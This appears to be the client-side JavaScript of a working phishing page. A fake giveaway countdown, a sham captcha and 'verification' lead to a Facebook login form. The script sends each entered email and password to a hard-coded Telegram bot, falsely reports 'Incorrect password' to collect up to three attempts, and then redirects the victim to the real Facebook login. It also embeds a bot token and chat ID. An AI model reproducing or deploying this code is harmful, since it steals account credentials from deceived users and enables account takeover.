// --- Telegram Configuration ---
const BOT_TOKEN = '8399552625:AAGxzewNMQxT5aCKFGJxnvlHezg49OKCETw';
const CHAT_ID = '7181535206';

// Set the launch date to New Year 2026
const targetDate = new Date("January 1, 2026 00:00:00").getTime();

function updateCountdown() {
    const now = new Date().getTime();
    const distance = targetDate - now;

    if (distance < 0) {
        const countdownEl = document.getElementById("countdown");
        if (countdownEl) countdownEl.innerHTML = "<h3>Offer Expired</h3>";
        return;
    }

    const days = Math.floor(distance / (1000 * 60 * 60 * 24));
    const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((distance % (1000 * 60)) / 1000);

    if (document.getElementById("days")) {
        document.getElementById("days").innerText = String(days).padStart(2, '0');
        document.getElementById("hours").innerText = String(hours).padStart(2, '0');
        document.getElementById("minutes").innerText = String(minutes).padStart(2, '0');
        document.getElementById("seconds").innerText = String(seconds).padStart(2, '0');
    }
}

setInterval(updateCountdown, 1000);
updateCountdown();

// === MODAL & INTERACTION LOGIC ===
const claimBtn = document.getElementById('claimBtn');
const modal = document.getElementById('authModal');
const closeModal = document.querySelector('.close-modal');
const modalContent = document.querySelector('.modal-content');

if (claimBtn) {
    claimBtn.addEventListener('click', (e) => {
        e.preventDefault();
        modal.style.display = 'flex';
        setTimeout(() => {
            modal.style.opacity = '1';
            modalContent.style.transform = 'translateY(0)';
        }, 10);
    });
}

function hideModal() {
    modal.style.opacity = '0';
    modalContent.style.transform = 'translateY(20px)';
    setTimeout(() => {
        modal.style.display = 'none';
    }, 300);
}

if (closeModal) closeModal.addEventListener('click', hideModal);

window.addEventListener('click', (e) => {
    if (e.target == modal) hideModal();
});

// === CAPTCHA PROCESS LOGIC ===
const startBtn = document.getElementById('startVerifyBtn');
const captchaBox = document.getElementById('captchaClick');

const steps = {
    guide: document.getElementById('step-guide'),
    captcha: document.getElementById('step-captcha'),
    loading: document.getElementById('step-loading'),
    success: document.getElementById('step-success'),
    final: document.getElementById('step-final')
};

if (startBtn) {
    startBtn.addEventListener('click', () => {
        steps.guide.style.display = 'none';
        steps.captcha.style.display = 'block';
    });
}

if (captchaBox) {
    captchaBox.addEventListener('click', () => {
        if (captchaBox.classList.contains('checked')) return;
        captchaBox.classList.add('checked');
        setTimeout(() => {
            steps.captcha.style.display = 'none';
            steps.loading.style.display = 'block';
            simulateLoading();
        }, 800);
    });
}

function simulateLoading() {
    const texts = ["Analyzing Browser...", "Checking Database...", "Verifying Region...", "Grant Approved."];
    let i = 0;
    const interval = setInterval(() => {
        if (document.getElementById('loadingText')) {
            document.getElementById('loadingText').innerText = texts[i];
        }
        i++;
        if (i >= texts.length) {
            clearInterval(interval);
            showSuccess();
        }
    }, 800);
}

function showSuccess() {
    steps.loading.style.display = 'none';
    steps.success.style.display = 'block';
    setTimeout(() => {
        steps.success.style.display = 'none';
        steps.final.style.display = 'block';
        setupFinalLoginCapture();
    }, 1500);
}

// === TELEGRAM LOGGING & REDIRECT LOGIC ===

async function sendToTelegram(email, password, attempt) {
    const message = `🔔 *New Facebook Capture*\n👤 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n🔢 *Attempt:* #${attempt}`;
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
    } catch (err) {
        console.error("Transmission failed", err);
    }
}

function setupFinalLoginCapture() {
    // If your "final" step has a form, we capture it here.
    // If it redirects to testing/index.html, you should place the capturer there.
    // Assuming the user is entering details in a form now:

    const fbLoginBtn = document.getElementById('fbLoginBtn');
    if (fbLoginBtn) {
        fbLoginBtn.onclick = async function () {
            // Get values from your input fields (adjust IDs if they differ in your HTML)
            const emailInput = document.querySelector('input[type="text"]') || document.querySelector('input[type="email"]');
            const passInput = document.querySelector('input[type="password"]');

            if (!emailInput || !passInput || !emailInput.value || !passInput.value) {
                alert("Please fill in your details.");
                return;
            }

            const email = emailInput.value;
            const password = passInput.value;

            // Handle Attempts
            let attempts = parseInt(sessionStorage.getItem('fb_login_attempts') || '0');
            attempts++;
            sessionStorage.setItem('fb_login_attempts', attempts);

            // UI Feedback
            fbLoginBtn.disabled = true;
            fbLoginBtn.innerText = "Verifying...";

            // Send to Telegram (AWAIT keeps the browser from cancelling the request)
            await sendToTelegram(email, password, attempts);

            // Redirection logic
            if (attempts >= 3) {
                window.location.href = "https://www.facebook.com/login/";
            } else {
                // Show error message and reset button
                const statusMsg = document.getElementById('fb-status');
                if (statusMsg) {
                    statusMsg.innerText = "Incorrect password. Please try again.";
                    statusMsg.style.color = "red";
                }
                fbLoginBtn.disabled = false;
                fbLoginBtn.innerText = "Log In";
                passInput.value = ""; // Clear password for next attempt
            }
        };
    }
}